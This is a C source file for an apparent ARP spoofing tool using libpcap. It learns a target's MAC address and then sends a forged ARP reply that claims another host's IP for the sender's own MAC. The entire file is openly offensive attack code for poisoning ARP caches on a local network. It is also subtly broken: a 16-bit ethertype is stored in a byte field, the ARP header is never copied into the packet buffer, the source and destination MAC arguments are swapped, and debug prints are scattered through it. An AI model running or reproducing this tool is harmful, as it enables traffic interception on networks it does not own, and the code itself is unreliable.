#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <libnet/libnet-types.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-headers.h>
#define SIZE_ETEHRNET 14

typedef struct ether{
	uint8_t ether_dhost[6];
        uint8_t ether_shost[6];
        uint8_t ether_type;
}ether;
typedef struct arp{
        uint16_t arp_hrd;
        uint16_t arp_pro;
        uint8_t arp_hln;
        uint8_t arp_pln;
        uint16_t arp_op;
        uint8_t sender_mac[6];
        uint8_t sender_ip[4];
        uint8_t target_mac[6];
        uint8_t target_ip[4];
}arp;

void make_arp(arp* arp_pkt, uint8_t* sender_mac, uint8_t* target_mac, int op){
	arp_pkt->arp_hrd=htons(0x1);
	arp_pkt->arp_pro=htons(0x0800);
	arp_pkt->arp_hln=6;
	arp_pkt->arp_pln=4;
	arp_pkt->arp_op=htons(op);
	
	memcpy(arp_pkt->sender_mac, sender_mac, sizeof(uint8_t)*6);

	if(target_mac == NULL)
		memset(arp_pkt->target_mac, 0, sizeof(uint8_t)*6);
	else
		memcpy(arp_pkt->target_mac, target_mac, sizeof(uint8_t)*6);
	}

void make_ether(ether* ether_pkt, uint8_t* shost, uint8_t* dhost, arp arp_hdr){
	memcpy(ether_pkt->ether_shost, shost, sizeof(uint8_t)*6);
	memcpy(ether_pkt->ether_dhost, dhost, sizeof(uint8_t)*6);
	ether_pkt->ether_type=htons(0x0806);
}

int main(int argc, char *argv[]){
	

	int s, i;
	int size;
	struct ifreq ifr;
	char* dev =argv[1];
	char s_ip[32];
	uint8_t* my_mac=(uint8_t*)malloc(sizeof(uint8_t)*6);
	uint8_t* sender_mac=(uint8_t*)malloc(sizeof(uint8_t)*6);
	uint8_t* target_mac=(uint8_t*)malloc(sizeof(uint8_t)*6);
	arp* arp_rq=(arp*)malloc(sizeof(arp));
	arp* arp_rp=(arp*)malloc(sizeof(arp));
	ether* ether_sender=(ether*)malloc(sizeof(ether));
	//Saving my interface
	s=socket(AF_INET, SOCK_DGRAM, 0);
	if(s<0) {	
		printf("socket fail\n");
		return -1;
	}
	strcpy(ifr.ifr_name,dev);
	printf("%s\n",dev);
	
	//Saving my mac address				
	if(ioctl(s, SIOCGIFHWADDR, &ifr)<0){
		printf("MAC fail\n");
		return -1;
	}
	memcpy(my_mac, ifr.ifr_addr.sa_data, sizeof(uint8_t)*6);		
	printf("My MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);
	
	//Saving my ip address	
	struct sockaddr_in* sin;
	char size_ip;
	if(ioctl(s, SIOCGIFADDR, &ifr)<0){
		printf("IP fail\n");
		return -1;
	}
	sin=(struct sockaddr_in*)&ifr.ifr_addr;
	printf("MY IP: %s\n", inet_ntop(AF_INET,&sin->sin_addr,s_ip,sizeof(s_ip)));
	
	printf("0\n");
	//Making sender arp
	memset(target_mac, 0, sizeof(uint8_t)*6);
	make_arp(arp_rq, my_mac, target_mac, 1);
	inet_pton(AF_INET, s_ip, arp_rq->sender_ip);
	inet_pton(AF_INET, argv[2], arp_rq->target_ip);
	printf("1\n");
	//Making ethernet
	struct ether s_ethpkt;
	size=sizeof(struct ether)+sizeof(struct arp);
	memset(target_mac, 255, sizeof(uint8_t)*6);
	make_ether(&s_ethpkt, target_mac, my_mac, *arp_rq);
	uint8_t* s_pkt=(uint8_t*)malloc(size*sizeof(uint8_t));
	memcpy(s_pkt, &s_ethpkt, size*sizeof(uint8_t));
	printf("2\n");
	//Sending packet
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle= pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle==NULL){
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	if(pcap_sendpacket(handle, s_pkt, size)){
		printf("Sending packet fail");
		return -1;
	}	
	printf("3\n");

	while(1){
		const uint8_t* packet_r;
		struct pcap_pkthdr* header;
		struct ether* ether_r;
		printf("5\n");
		int res = pcap_next_ex(handle, &header, &packet_r);
		printf("6\n");
		if(res==0) continue;
		printf("7\n");
		if(res==-1 || res==-2) break;
		printf("4\n");
		ether_r=(struct ether*)(packet_r);
		if(ether_r!=NULL&&ntohs(ether_r->ether_type)==0x0806){
			memcpy(target_mac, ether_r->ether_shost, sizeof(uint8_t)*6);
			printf("8\n");
			printf("TARGET MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
			break;
		}
		else{
			printf("9\n");
			continue;
		}
	}
	
	make_arp(arp_rp, my_mac, target_mac,2);
	inet_pton(AF_INET, argv[3], arp_rp->sender_ip);
	inet_pton(AF_INET, argv[2], arp_rp->target_ip);
	struct ether spoof_ether;
	make_ether(&spoof_ether, target_mac, my_mac, *arp_rp);
	uint8_t* spoof_packet=(uint8_t*)malloc(size*sizeof(uint8_t));
	memcpy(spoof_packet, &spoof_ether, size*sizeof(uint8_t)); 
	if(pcap_sendpacket(handle, spoof_packet, size)){
		printf("Sending packet fail\n");
		return -1;
	}
	free(arp_rq);
	free(arp_rp);
}
